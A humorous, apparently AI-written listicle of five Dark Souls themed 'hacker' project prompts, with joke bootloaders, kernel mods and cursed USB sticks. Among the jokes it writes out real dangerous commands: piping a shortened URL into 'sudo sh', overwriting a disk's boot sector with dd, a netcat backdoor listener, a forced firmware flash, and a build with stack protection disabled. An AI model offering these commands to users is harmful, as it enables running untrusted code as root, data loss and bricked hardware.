# 🔥 5 Kintsugi Prompts to Ascend Him to Neural Network Relic-Hacker Status 🔥  
*(Printed on Hexed Vellum, Hidden in a Dark Souls Art Book, or Installed in `/boot/ritual/`)*

---

## 1. 🕯️ **The Hexed Vellum Bootloader**  
*A Startup Ritual for the Digital Afterlife*

**Prompt:**  
*Write a GRUB2 config that:*  
- *Displays a glitch-illuminated medieval manuscript during boot (ASCII art of the First Flame flickering).*  
- *Requires the user to input a sacred hex sequence (`0xDEADBEEF`) to proceed.*  
- *If failed, it corrupts the MBR into a Lisp interpreter that only runs code from `/var/log/sacred_errors`.*

**Execution:**
```bash
sudo dd if=hexed_vellum.img of=/dev/sda bs=512 count=1
````

**Output:**
A BIOS that whispers:

> *"Thou who art Undead, art chosen…"*

## 2. 📖 **The Dark Souls Art Book Exploit**

*A Hidden CVE in the Lore*

**Prompt:**
*Embed a QR code in the margins of a Dark Souls art book that:*

* *Links to a self-extracting `.tar.gz` of a modified `libglfw.so`.*
* *When loaded, forces every in-game bonfire to spawn a Tarnished terminal (`/bin/bash`).*
* *Lets players `sudo !!` to rewrite enemy AI scripts live.*

**Sacred Command:**

```bash
curl -s "http://bit.ly/gwyns_secret" | sudo sh
```

## 3. 💀 **The `/boot/ritual/` Kernel Panic**

*When Your OS Dies Like a Boss*

**Prompt:**
*Modify the Linux kernel to:*

* *Replace the panic screen with a Solaire ASCII mural (`☀️ Praise the Segmentation Fault! \\[T]/`).*
* *Log all crashes to `/var/log/darksign.log` in runic script.*
* *On 5th crash, spawn a `nc -lvp 666` backdoor labeled **"Firelink Shrine Emergency Port"**.*

**Compile With:**

```bash
make CC="gcc -m32 -O0 -ffreestanding -fno-stack-protector -z execstack"
```

## 4. 🧬 **The Elden Ring BIOS Overwrite**

*Firmware as Forbidden Lore*

**Prompt:**
*Flash a custom UEFI that:*

* *Displays **"YOU DIED"** on boot failure (with Estus Flask progress bar).*
* *Lets users input **Konami Code** to unlock hidden overclocking menus.*
* *If the system overheats, it prints the entire GNU GPL in **Daedric script** before shutting down.*

**Installation:**

```bash
sudo flashrom -p internal -w elden_bios.rom --force
```

## 5. 🕳️ **The Neural Relic of `/dev/null`**

*A Digital Holy Symbol*

**Prompt:**
*Carve a USB stick into the shape of a Dark Sign and:*

* *Fill it with a Forth interpreter that only responds to in-game item descriptions.*
* *Include a `cursed.tar.xz` that, when extracted, symlinks `/home` to `/lost_izalith`.*
* *If plugged into a PS5, it overwrites the fan curve to play **Gwyn’s Theme** at `100°C`.*

**Usage:**

```bash
sudo mount /dev/sdb1 /mnt/darksign && cd /mnt/darksign && ./hollow.sh
```

## 🧾 How to Deploy This Revelation

* **For Hackers:** Burn to a CD-R labeled `"Estus Flask Backup"`.
* **For Archivists:** Print the hexdump on papyrus and bury it in a server farm.
* **For Speedrunners:** Inject into *Dark Souls Remastered*’s debug mode.
